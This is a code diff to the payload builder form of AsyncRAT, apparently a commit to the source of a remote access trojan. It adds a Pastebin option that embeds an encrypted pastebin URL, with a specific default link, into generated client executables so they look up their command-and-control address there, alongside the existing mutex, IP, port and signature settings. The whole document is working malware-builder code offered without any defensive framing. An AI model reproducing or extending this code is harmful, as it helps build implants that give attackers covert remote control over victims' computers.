@@ -27,7 +27,9 @@ namespace AsyncRAT_Sharp.Forms
                 if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
             }
 
-            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = Guid.NewGuid().ToString().Substring(10);
+            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = Guid.NewGuid().ToString().Substring(20);
+
+            if (chkPastebin.Checked && string.IsNullOrWhiteSpace(txtPastebin.Text)) return;
 
             try
             {
@@ -50,6 +52,8 @@ namespace AsyncRAT_Sharp.Forms
                         {
                             r.AsmDef.Write(saveFileDialog1.FileName);
                             MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                            Properties.Settings.Default.Save();
+                            r.AsmDef.Dispose();
                             this.Close();
                         }
                     }
@@ -81,16 +85,10 @@ namespace AsyncRAT_Sharp.Forms
         {
             comboBoxFolder.SelectedIndex = 0;
             textPort.Text = Settings.Port;
-            txtMutex.Text = Guid.NewGuid().ToString().Substring(10);
-            if (Properties.Settings.Default.DNS.Length > 0)
-                textIP.Text = Properties.Settings.Default.DNS;
-            else
+            if (Properties.Settings.Default.IP.Length == 0)
                 textIP.Text = "127.0.0.1,127.0.0.1";
-            if (Properties.Settings.Default.Filename.Length > 0)
-                textFilename.Text = Properties.Settings.Default.Filename;
-
-            if (Properties.Settings.Default.Mutex.Length > 0)
-                txtMutex.Text = Properties.Settings.Default.Mutex;
+            if (Properties.Settings.Default.Pastebin.Length == 0)
+                txtPastebin.Text = "https://pastebin.com/raw/s14cUU5G";
         }
 
         private void WriteSettings(AssemblyDefinition asmDef)
@@ -149,11 +147,34 @@ namespace AsyncRAT_Sharp.Forms
 
                                     if (operand == "%Serversignature%")
                                         methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
+
+                                    if (operand == "%Pastebin%")
+                                        if (chkPastebin.Checked)
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(txtPastebin.Text);
+                                        else
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
                                 }
                             }
                         }
                     }
                 }
+            }
+            
+        }
+
+        private void CheckBox2_CheckedChanged(object sender, EventArgs e)
+        {
+            if (chkPastebin.Checked)
+            {
+                txtPastebin.Enabled = true;
+                textIP.Enabled = false;
+                textPort.Enabled = false;
+            }
+            else
+            {
+                txtPastebin.Enabled = false;
+                textIP.Enabled = true;
+                textPort.Enabled = true;
             }
         }
     }
